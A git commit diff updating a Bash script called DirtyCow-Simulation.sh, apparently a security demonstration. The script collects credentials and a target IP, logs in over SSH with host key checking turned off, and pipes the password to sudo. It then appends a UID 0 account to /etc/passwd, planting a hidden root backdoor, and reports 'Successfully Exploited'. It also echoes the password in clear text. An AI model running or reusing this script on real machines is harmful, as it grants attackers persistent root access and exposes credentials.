57e24fa0bdeabc898f366845d5182ed4a67f3488
SecuritySura <surangapremakumara@gmail.com>
2020-08-08 11:41:28 -0700

    Update DirtyCow-Simulation.sh

--- DirtyCow-Simulation.sh
+++ DirtyCow-Simulation.sh
@@ -1,14 +1,38 @@
 #!/bin/bash
 
-sshpass -p '123' ssh linux1@172.20.10.10 << EOF
+
+echo ''
+printf "Please enter the username: " 
+read username
+echo ''
+###echo -n "Please enter the password" 
+###read -s password
+stty -echo
+printf "Password: "
+read password
+stty echo
+printf "\n"
+
+printf "Please enter Server IP: " 
+read serverip
+echo ''
+
+printf "Please enter hackername: " 
+read BlackSmith
+echo ''
+
+sshpass -p $password ssh -l $username -o StrictHostKeyChecking=no $serverip  << EOF
 echo 'old passwd file'
 echo ''
-cat /etc/passwd
+#cat /etc/passwd
 echo ''
 
-sudo su
+#sudo su
+echo $password ;
 
-echo 'BlackSmith:x:0:1000::/home/goodguy:/bin/bash' >> /etc/passwd
+echo -e "$password\n"  | sudo -S cat /etc/passwd && sudo su
+
+echo '$BlackSmith:x:0:1000::/home/goodguy:/bin/bash' >> /etc/passwd
 echo ''
 echo ''
 echo 'Successfully Exploited...!'
